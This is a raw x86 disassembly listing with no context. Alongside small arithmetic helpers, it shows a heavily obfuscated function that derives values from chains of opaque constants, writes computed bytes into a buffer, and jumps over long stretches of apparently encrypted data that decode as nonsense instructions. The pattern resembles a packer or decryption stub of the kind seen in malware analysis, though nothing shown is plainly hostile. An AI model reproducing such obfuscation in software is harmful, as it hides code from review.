  416be0:	and    eax,0xfb78c43b
  416be5:	mov    eax,ds:0xe58bf823
  416bea:	fild   QWORD PTR [ebx]
  416bec:	sti    
  416bed:	loop   0x416c22
  416bef:	ror    BYTE PTR [ebx],cl
  416bf1:	ret    0xc703
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42828f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x4283bb,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42826b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282e3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428343,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x42822b
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42826f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0x55
  416d7e:	sbb    eax,0xf47aaa53
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    cl,dl
  416d8a:	dec    ebx
  416d8b:	add    esp,DWORD PTR [edi]
  416d8d:	mov    ah,0xe9
  416d8f:	add    DWORD PTR gs:[edx],esp
  416d92:	ror    BYTE PTR [ecx+0x602449c9],0xb0
  416d99:	mov    bh,0x93
  416d9b:	xchg   dl,ah
  416d9d:	cli    
  416d9e:	pop    es
  416d9f:	sahf   
  416da0:	push   eax
  416da1:	sbb    BYTE PTR [edi+edx*1+0x61b3868b],ch
  416da8:	pop    ecx
  416da9:	retf   0x95b8
  416dac:	into   
  416dad:	out    0x9e,al
  416daf:	out    0xd3,eax
  416db1:	packssdw mm2,QWORD PTR [esi+0x10]
  416db5:	inc    eax
  416db6:	and    BYTE PTR [edx+0x45],dl
  416db9:	rol    BYTE PTR [ebp-0x410cc97e],cl
  416dbf:	rcr    ah,cl
  416dc1:	aam    0x82
  416dc3:	fucom  st(0)
  416dc5:	imul   edi,DWORD PTR [edi-0x540d0b91],0x4e4ff45
  416dcf:	adc    edx,edx
  416dd1:	fwait
  416dd2:	jle    0x416df9
  416dd4:	call   DWORD PTR [edi]
  416dd6:	ficom  WORD PTR [edi]
  416dd8:	int3   
  416dd9:	scas   al,BYTE PTR es:[edi]
  416dda:	std    
  416ddb:	iret   
  416ddc:	mov    bl,bl
  416dde:	enter  0x7a0c,0x57
  416de2:	pop    ebp
  416de3:	mov    DWORD PTR [ecx+0x9],ebx
  416de6:	pop    eax
  416de7:	std    
  416de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de9:	push   edi
  416dea:	adc    dh,BYTE PTR [ebp+0x71]
  416ded:	(bad)  
  416dee:	mul    esi
  416df0:	pop    ebx
  416df1:	jecxz  0x416dd2
  416df3:	xor    eax,0x7b0cc113
  416df8:	push   ecx
  416df9:	mov    bl,0xce
  416dfb:	lahf   
  416dfc:	in     eax,0x7a
  416dfe:	pop    edx
  416dff:	test   DWORD PTR [eax],ebx
  416e01:	xor    ch,ch
  416e03:	sub    esi,DWORD PTR [eax-0x4a]
  416e06:	stos   BYTE PTR es:[edi],al
  416e07:	loope  0x416e38
  416e09:	nop
  416e0a:	xor    esp,DWORD PTR [edi]
  416e0c:	sar    DWORD PTR es:[esi],cl
  416e0f:	les    edx,FWORD PTR [ebp-0xad6a92e]
  416e15:	fisttp DWORD PTR ds:0xdeeb577a
  416e1b:	sbb    al,0x45
  416e1d:	mov    ds:0xaa9f5e6f,al
  416e22:	loopne 0x416dc6
  416e24:	dec    edx
  416e25:	rcl    DWORD PTR [eax+0x4d0e019d],1
  416e2b:	out    dx,eax
  416e2c:	sahf   
  416e2d:	fs mov edi,0x7baaad01
  416e33:	mov    edi,DWORD PTR [edx]
  416e35:	push   eax
  416e36:	xchg   ebx,eax
  416e37:	or     DWORD PTR [ecx],eax
  416e39:	adc    ecx,esp
  416e3b:	push   esp
  416e3c:	(bad)  
  416e3d:	adc    eax,0x3d5aa86c
  416e42:	cmp    esi,DWORD PTR [esi-0x67767143]
  416e48:	pop    DWORD PTR [ecx-0x7833ba62]
  416e4e:	push   edx
  416e4f:	mov    bh,0xdc
  416e51:	out    dx,eax
  416e52:	mov    bl,0x96
  416e54:	in     al,dx
  416e55:	add    DWORD PTR [edx],0x46
  416e58:	imul   eax,ecx,0xe73350d0
  416e5e:	std    
  416e5f:	adc    ebp,DWORD PTR [edx]
  416e61:	icebp  
  416e62:	jecxz  0x416eb4
  416e64:	stos   BYTE PTR es:[edi],al
  416e65:	retf   
  416e66:	xor    ebp,DWORD PTR [ebx+0x1f]
  416e69:	cmp    eax,0x3ed10455
  416e6e:	dec    ecx
  416e6f:	aaa    
  416e70:	dec    edi
  416e71:	inc    edx
  416e72:	push   cs
  416e73:	and    al,0x41
  416e75:	sbb    bl,bl
  416e77:	and    DWORD PTR [edx-0x2b2ccdbe],edi
  416e7d:	vpopcntb zmm0{k6}{z},zmm3
  416e83:	hlt    
  416e84:	stc    
  416e85:	mov    dl,0x6a
  416e87:	push   ss
  416e88:	retf   
  416e89:	cs daa 
  416e8b:	leave  
  416e8c:	fdiv   QWORD PTR [edx]
  416e8e:	sub    al,bh
  416e90:	ret    
  416e91:	sub    BYTE PTR [edi+0x36],dh
  416e94:	std    
  416e95:	arpl   WORD PTR [esi],bp
  416e97:	mov    bl,0xc7
  416e99:	or     al,0xe4
  416e9b:	cmp    eax,0x8f7894f
  416ea0:	sbb    ebx,esp
  416ea2:	ficomp WORD PTR [ebx-0x39b4a54f]
  416ea8:	push   eax
  416ea9:	(bad)  
  416eaa:	cmp    DWORD PTR [ebx-0x6c6fed1f],eax
  416eb0:	mov    ecx,0x56936d96
  416eb5:	ret    0x7b2c
  416eb8:	inc    esp
  416eb9:	(bad)  
  416eba:	mov    ah,0xd1
  416ebc:	sub    al,0xa
  416ebe:	sti    
  416ebf:	sbb    eax,DWORD PTR [esi+eiz*1+0x43]
  416ec3:	cmp    DWORD PTR [eax+ebp*1-0x7f],ebx
  416ec7:	mov    edx,0xd7d69567
  416ecc:	dec    ebp
  416ecd:	push   ebp
  416ece:	mov    bl,0x8a
  416ed0:	or     al,BYTE PTR [edx-0x7f]
  416ed3:	(bad)  
  416ed5:	lahf   
  416ed6:	pop    es
  416ed7:	add    esp,edx
  416ed9:	imul   ecx,DWORD PTR [edx],0x61
  416edc:	out    0x5b,al
  416ede:	pop    ecx
  416edf:	leave  
  416ee0:	jle    0x416f29
  416ee2:	add    BYTE PTR [esi-0x47add3af],ch
  416ee8:	dec    ebx
  416ee9:	push   0x465d08fd
  416eee:	out    0x23,al
  416ef0:	sub    BYTE PTR [esp+ebx*1+0x211f8dc5],dl
  416ef7:	popa   
  416ef8:	rcr    cl,cl
  416efa:	aam    0x5b
  416efc:	dec    edx
  416efd:	cmp    esp,esp
  416eff:	xchg   ecx,eax
  416f00:	in     eax,0xe9
  416f02:	xor    al,0xac
  416f04:	pop    ebx
  416f05:	add    eax,DWORD PTR [ebp-0x7f12f998]
  416f0b:	fs pushf 
  416f0d:	adc    DWORD PTR [eax],eax
  416f0f:	mov    eax,ds:0x93daf5d2
  416f14:	mov    cl,0xd3
  416f16:	jne    0x416f2f
  416f18:	mov    ecx,0x26ceaa4a
  416f1d:	sub    BYTE PTR ss:[esi+0x7b],dl
  416f21:	push   ss
  416f22:	(bad)
  416f26:	enter  0xcf59,0x7
  416f2a:	je     0x416f79
  416f2c:	out    dx,al
  416f2d:	and    al,0x7c
  416f2f:	adc    ebx,edx
  416f31:	bnd call 0xe57cbd8b
  416f37:	mov    ch,0x6e
  416f39:	jmp    0x8549:0x8a8bb296
  416f40:	cmp    DWORD PTR [ebx+0x2bd45dd2],edx
  416f46:	test   eax,0x3ff328cb
  416f4b:	daa    
  416f4c:	pop    edx
  416f4d:	ror    BYTE PTR [ebp+0x36],0x72
  416f51:	inc    edx
  416f52:	sti    
  416f53:	mov    edi,0xe6475317
  416f58:	inc    ebx
  416f59:	test   al,0xe0
  416f5b:	loopne 0x416f73
  416f5d:	out    dx,eax
  416f5e:	in     eax,0x73
  416f60:	xchg   ebx,eax
  416f61:	cli    
  416f62:	imul   eax,DWORD PTR [edx+0x3de7dcd4],0x780b606c
  416f6c:	xchg   esi,eax
  416f6d:	dec    esp
  416f6e:	mov    dh,0x99
  416f70:	push   eax
  416f71:	mov    ebx,0xc58276c
  416f76:	adc    al,0xe3
  416f78:	xlat   BYTE PTR ds:[ebx]
  416f79:	push   esi
  416f7a:	xor    cl,ah
  416f7c:	hlt    
  416f7d:	fistp  DWORD PTR [edx]
  416f7f:	in     al,dx
  416f80:	aas    
  416f81:	in     al,0x89
  416f83:	es int3 
  416f85:	ret    0x59fe
  416f88:	ins    WORD PTR es:[edi],dx
  416f8a:	dec    ebx
  416f8b:	add    al,0xac
  416f8d:	jp     0x416f33
  416f8f:	xchg   BYTE PTR [eax-0x67],bh
  416f92:	leave  
  416f93:	sbb    bl,BYTE PTR [esi-0x9dc080f]
  416f99:	mov    esp,0xa9195c96
  416f9e:	pushf  
  416f9f:	lds    ebp,FWORD PTR [edx+0xd0dd2f9]
  416fa5:	mov    eax,ds:0x83a8519d
  416faa:	fnclex 
  416fac:	scas   al,BYTE PTR es:[edi]
  416fad:	dec    esi
  416fae:	fwait
  416faf:	sub    ah,0x2
  416fb2:	sbb    eax,DWORD PTR [eax+edx*8-0x61]
  416fb6:	pop    ebp
  416fb7:	sbb    DWORD PTR ds:0x11bd14d8,edx
  416fbd:	pop    ebx
  416fbe:	mov    eax,0xdf7fd68b
  416fc3:	mov    esi,0x8627c82f
  416fc8:	fdiv   QWORD PTR [ecx-0x66]
  416fcb:	data16 aam 0xae
  416fce:	mov    al,0x1f
  416fd0:	fsubr  DWORD PTR [ebx+0x7fcb510]
  416fd6:	xchg   ebx,eax
  416fd7:	mov    DWORD PTR [ebx+0x6d42e166],ebx
  416fdd:	out    0xd4,ax
  416fe0:	mov    ebx,0xda029fe4
  416fe5:	rcr    edi,cl
  416fe7:	xchg   edx,eax
  416fe8:	cdq    
  416fe9:	inc    ebp
  416fea:	push   ss
  416feb:	xchg   ebx,eax
  416fec:	sbb    edx,edi
  416fee:	in     eax,dx
  416fef:	(bad)  
  416ff0:	dec    edi
  416ff1:	call   0x3c724b15
  416ff6:	imul   ebx,ebp,0x56
  416ff9:	cdq    
  416ffa:	cs push eax
  416ffc:	mov    ch,0xb0
  416ffe:	pop    ds
  416fff:	xlat   BYTE PTR ds:[ebx]
  417000:	popa   
  417001:	lahf   
  417002:	sbb    esi,DWORD PTR [esi-0x50]
  417005:	sbb    dl,ah
  417007:	out    dx,eax
  417008:	ror    BYTE PTR [ebx-0x16],1
  41700b:	push   0x10fd496a
  417010:	into   
  417011:	(bad)  [edx+esi*8-0x43]
  417015:	fwait
  417016:	leave  
  417017:	cmp    BYTE PTR [eax+0x4663eba3],dl
  41701d:	loope  0x417033
  41701f:	push   edx
  417020:	ficomp DWORD PTR [eax+ecx*2+0x37988e67]
  417027:	mov    cl,0x81
  417029:	in     eax,dx
  41702a:	mov    cl,0x6b
  41702c:	in     al,dx
  41702d:	or     edx,DWORD PTR [ecx+eiz*1+0x4d]
  417031:	mov    WORD PTR [esi+edx*1-0xa1264e5],es
  417038:	mov    edi,DWORD PTR [esi]
  41703a:	and    eax,0xd777cdab
  41703f:	lahf   
  417040:	fwait
  417041:	jmp    0xd09b:0x7890e99e
  417048:	ror    DWORD PTR [eax-0x31b6b18e],0xe1
  41704f:	rcl    DWORD PTR [edi+0x2752e232],cl
  417055:	stos   BYTE PTR es:[edi],al
  417056:	sub    DWORD PTR [ecx],0xffffffe9
  417059:	sub    eax,0xa4c6f7e1
  41705e:	mov    dl,0xf
  417060:	and    BYTE PTR ds:0xbb3aa48e,cl
  417066:	push   ecx
  417067:	neg    BYTE PTR [ecx+0x1fa0d030]
  41706d:	mov    ah,0xc5
  41706f:	and    esi,esi
  417071:	out    0x7c,eax
  417073:	cld    
  417074:	imul   eax,DWORD PTR [eax],0xffffffff
  417077:	out    0x59,al
  417079:	or     ecx,esp
  41707b:	aam    0xff
  41707d:	jne    0x417025
  41707f:	imul   eax,edx,0x84615654
  417085:	sub    al,BYTE PTR [eax+0x66cde4e7]
  41708b:	movq   mm5,mm1
  41708e:	fimul  DWORD PTR [ebp-0x41597019]
  417094:	stc    
  417095:	retf   
  417096:	cwde   
  417097:	test   BYTE PTR ds:0xc54dde6f,dh
  41709d:	psubq  mm5,QWORD PTR [ebx]
  4170a0:	and    ebx,DWORD PTR [esi+0x15c15ae4]
  4170a6:	pop    ebp
  4170a7:	cdq    
  4170a8:	and    ecx,DWORD PTR [ebx+0x4d8bf045]
  4170ae:	in     al,dx
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x6af27f81
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    dh,bl
  41719f:	ret    0x2883
  4171a2:	inc    ecx
  4171a3:	inc    eax
  4171a4:	mov    gs,edx
  4171a6:	dec    edi
  4171a7:	add    ebx,esi
  4171a9:	test   al,0x62
  4171ab:	aad    0xd8
  4171ad:	or     dh,BYTE PTR [edx-0x3cd08cd]
  4171b3:	xlat   BYTE PTR ds:[ebx]
  4171b4:	std    
  4171b5:	les    esi,FWORD PTR [ecx]
  4171b7:	clc    
  4171b8:	js     0x4171a7
  4171ba:	test   al,0xfc
  4171bc:	loope  0x417209
  4171be:	jp     0x417181
  4171c0:	push   ss
  4171c1:	nop
  4171c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c3:	dec    edx
  4171c4:	mov    ch,0xf1
  4171c6:	retf   0xad09
  4171c9:	hlt    
  4171ca:	call   0xd421c055
  4171cf:	xor    BYTE PTR [edx],al
  4171d1:	pop    ebp
  4171d2:	daa    
  4171d3:	mov    ebx,0x5026b3e4
  4171d8:	shl    DWORD PTR [eax+0x1eed2c8],cl
  4171de:	adc    dl,BYTE PTR [eax]
  4171e0:	test   al,0x2a
  4171e2:	lock in eax,dx
  4171e4:	push   ss
  4171e5:	adc    eax,0x91422b04
  4171ea:	push   ebx
  4171eb:	xchg   ecx,eax
  4171ec:	jo     0x417197
  4171ee:	sbb    dl,BYTE PTR [edx+0x1d]
  4171f1:	and    eax,0x4fedf052
  4171f6:	jno    0x41719d
  4171f8:	push   esi
  4171f9:	xchg   edi,eax
  4171fa:	shl    DWORD PTR [ebx+esi*2+0x6c],cl
  4171fe:	outs   dx,DWORD PTR ds:[esi]
  4171ff:	add    BYTE PTR [esi],dh
  417201:	dec    ebp
  417202:	fld    DWORD PTR ds:0xf1f75f91
  417208:	xor    ah,0x91
  41720b:	pop    ebx
  41720c:	(bad)  
  41720d:	into   
  41720e:	xor    BYTE PTR [eax],al
  417210:	aaa    
  417211:	lods   al,BYTE PTR ds:[esi]
  417212:	mov    eax,ds:0x4011cd71
  417217:	push   edx
  417218:	cmp    edx,DWORD PTR ds:0x3ee1444e
  41721e:	dec    edi
  41721f:	add    BYTE PTR [ebx+0x26],ch
  417222:	ins    BYTE PTR es:[edi],dx
  417223:	or     ebp,edi
  417225:	sub    al,BYTE PTR [edx]
  417227:	test   ah,0x52
  41722a:	imul   ebx,ebp,0xffffff93
  41722d:	mov    eax,ds:0xfd4bebba
  417232:	arpl   WORD PTR [eax-0x4d3ea84f],ax
  417238:	ja     0x417205
  41723a:	fidivr WORD PTR ds:[edi+0x6d]
  41723e:	xchg   esi,eax
  41723f:	hlt    
  417240:	sbb    DWORD PTR [edi-0x62],edx
  417243:	ret    0x7342
  417246:	test   eax,0x6b5ae910
  41724b:	sub    eax,0x6937368d
  417250:	out    0x46,al
  417252:	xchg   edi,eax
  417253:	icebp  
  417254:	or     al,0x1e
  417256:	mov    eax,ds:0x35f6ad86
  41725b:	inc    ebp
  41725c:	dec    edx
  41725d:	out    dx,eax
  41725e:	or     edx,ebx
  417260:	mov    ah,0x50
  417262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417263:	pop    esp
  417264:	fidiv  WORD PTR [edx-0x3a]
  417267:	jle    0x417222
  417269:	push   0xffffffa2
  41726b:	xor    DWORD PTR [edi+ebp*2-0x1],edx
  41726f:	sub    eax,0x47a1d87
  417274:	mov    ch,0xea
  417276:	inc    ebp
  417278:	pop    edi
  417279:	mov    fs,eax
  41727b:	xor    eax,0xe4c2ff7e
  417280:	imul   edi,eax,0x57
  417283:	in     al,0xc7
  417285:	push   0x858672f9
  41728a:	xchg   esp,eax
  41728b:	add    ch,dh
  41728d:	add    eax,0x700d0b95
  417292:	fild   WORD PTR [eax]
  417294:	push   edx
  417295:	jo     0x4172ca
  417297:	cmp    ch,BYTE PTR [ecx+eiz*4]
  41729a:	jno    0x417275
  41729c:	push   ss
  41729d:	inc    ebx
  41729e:	pop    edi
  41729f:	push   ecx
  4172a0:	mov    WORD PTR [ecx+ebx*1+0x2164f104],?
  4172a7:	popa   
  4172a8:	adc    ebp,DWORD PTR [edx+0x9]
  4172ab:	jmp    FWORD PTR [edi-0x1c]
  4172ae:	pop    edi
  4172af:	mov    BYTE PTR [ecx],ch
  4172b1:	mov    ds:0xa055c1f,eax
  4172b6:	mov    ebp,0x94a5fc09
  4172bb:	xor    BYTE PTR [ebx],al
  4172bd:	fcomp  QWORD PTR [ebp-0x338f30aa]
  4172c3:	xchg   ebp,eax
  4172c4:	mov    al,0x13
  4172c6:	popf   
  4172c7:	enter  0x6e29,0xdd
  4172cb:	pusha  
  4172cc:	(bad)  
  4172cd:	jl     0x4172f0
  4172cf:	inc    esi
  4172d0:	mov    esi,0xa9195a75
  4172d5:	sti    
  4172d6:	and    BYTE PTR [ebp+0xf],dl
  4172d9:	mov    bl,0xb0
  4172db:	xor    eax,0x94923020
  4172e0:	mov    esp,0x1de60b20
  4172e5:	cmp    DWORD PTR [eax+0xf18df8b],esp
  4172eb:	ret    0x89ae
  4172ee:	mov    ebp,0xaa09a2f7
  4172f3:	push   es
  4172f4:	ss push eax
  4172f6:	cdq    
  4172f7:	daa    
  4172f8:	jecxz  0x41728a
  4172fa:	inc    esi
  4172fc:	jb     0x417320
  4172fe:	daa    
  4172ff:	arpl   WORD PTR [eax-0x4667d4c5],sp
  417305:	inc    esp
  417306:	sbb    eax,0x5f1b5f03
  41730b:	(bad)  
  41730c:	(bad)  
  41730d:	cmp    ebx,DWORD PTR [ebp+0x31329f81]
  417313:	dec    ebp
  417314:	(bad)  
  417315:	push   edi
  417316:	and    ah,BYTE PTR [ebx+0x35]
  417319:	and    esi,DWORD PTR [ebx+0x9]
  41731c:	cli    
  41731d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41731e:	pop    ecx
  41731f:	adc    DWORD PTR [eax-0x60],eax
  417322:	mov    al,0x60
  417324:	cmp    al,BYTE PTR [edi-0x38]
  417327:	xor    bl,BYTE PTR [esp+ecx*1+0x4122126d]
  41732e:	mov    dl,0x4d
  417330:	fst    DWORD PTR [ecx]
  417332:	mov    ecx,0x3838d9a0
  417337:	sub    dh,dh
  417339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41733a:	jp     0x417331
  41733c:	mov    edi,0x63d187b
  417341:	fdivr  DWORD PTR [ebp-0x61]
  417344:	mov    eax,ds:0x227430d6
  417349:	inc    esi
  41734a:	or     DWORD PTR [eax],esp
  41734c:	neg    BYTE PTR [ebp+esi*8-0x21cd14f1]
  417353:	mov    ah,0x7d
  417355:	mov    ebp,0xbf2a7229
  41735a:	mov    ds:0x522826e7,eax
  41735f:	out    0xcb,eax
  417361:	inc    ebp
  417362:	dec    ecx
  417363:	dec    ecx
  417364:	inc    esp
  417365:	mov    ecx,0xa1d20b9e
  41736a:	pop    ebx
  41736b:	stos   BYTE PTR es:[edi],al
  41736c:	retf   
  41736d:	arpl   si,di
  41736f:	outs   dx,BYTE PTR ds:[esi]
  417370:	mov    esi,0xb38c15a3
  417375:	pushf  
  417376:	mov    ch,0x81
  417378:	mov    esp,0x7b0ebb48
  41737d:	pop    eax
  41737e:	int3   
  41737f:	fdivr  st(5),st
  417381:	mov    dh,0x21
  417383:	or     BYTE PTR [ebp+0x6d],0x8d
  417387:	loop   0x417318
  417389:	pushf  
  41738a:	and    al,bh
  41738c:	sbb    eax,0x88472b18
  417391:	fidiv  WORD PTR [esi+0x1fa47ae1]
  417397:	loop   0x417321
  417399:	mov    dh,0x58
  41739b:	xchg   ebx,eax
  41739c:	xor    bh,bl
  41739e:	aad    0xc7
  4173a0:	(bad)  
  4173a1:	jbe    0x4173b4
  4173a3:	jmp    0x8cb51f96
  4173a8:	lea    ecx,[ebx+0x5328deb1]
  4173ae:	loope  0x41733f
  4173b0:	jmp    0x6b60:0xf1a9f8a7
  4173b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173b8:	ficom  DWORD PTR [esi-0x58]
  4173bb:	sahf   
  4173bc:	jmp    0x32c9:0x9c8cdc0b
  4173c3:	mov    gs,WORD PTR [edx]
  4173c5:	arpl   WORD PTR [ecx],bx
  4173c7:	push   ebp
  4173c8:	mov    WORD PTR [edx+0x29c398e4],?
  4173ce:	fnstenv [eax]
  4173d0:	xor    DWORD PTR [edx+0x4e64d63c],esp
  4173d6:	out    0xbd,al
  4173d8:	mov    bl,0x2d
  4173da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173db:	pop    ecx
  4173dc:	cld    
  4173dd:	jg     0x4173b1
  4173df:	and    eax,0x395733a8
  4173e4:	push   es
  4173e5:	sbb    dl,0x1d
  4173e8:	aad    0xf
  4173ea:	jg     0x4173db
  4173ec:	adc    al,0xe3
  4173ee:	inc    ecx
  4173ef:	in     eax,dx
  4173f0:	lods   eax,DWORD PTR ds:[esi]
  4173f1:	ficom  DWORD PTR [edx+ebx*4+0xa]
  4173f5:	or     al,0xdb
  4173f7:	aas    
  4173f8:	fisubr DWORD PTR [edi]
  4173fa:	cmp    eax,0x278cc50f
  4173ff:	sbb    ebp,DWORD PTR [eax-0x345e7a1d]
  417405:	or     al,0xaa
  417407:	rcl    bh,1
  417409:	ins    DWORD PTR es:[edi],dx
  41740a:	dec    eax
  41740b:	xchg   BYTE PTR [esi-0x35c2c73e],ah
  417411:	jecxz  0x4173c0
  417413:	mov    bl,0x1d
  417415:	ss dec edi
  417417:	mov    bh,0xc8
  417419:	(bad)  
  41741a:	ror    BYTE PTR [edx-0x77],1
  41741d:	pop    edx
  41741e:	jge    0x417499
  417420:	(bad)  
  417421:	cmp    eax,0xcf3a7e7b
  417426:	ja     0x417441
  417428:	and    ebx,edx
  41742a:	pop    ss
  41742b:	aad    0x9f
  41742d:	or     edx,edi
  41742f:	jmp    0x433:0x2dc6ade1
  417436:	sub    dh,dl
  417438:	leave  
  417439:	mov    bh,0x59
  41743b:	adc    ebp,edx
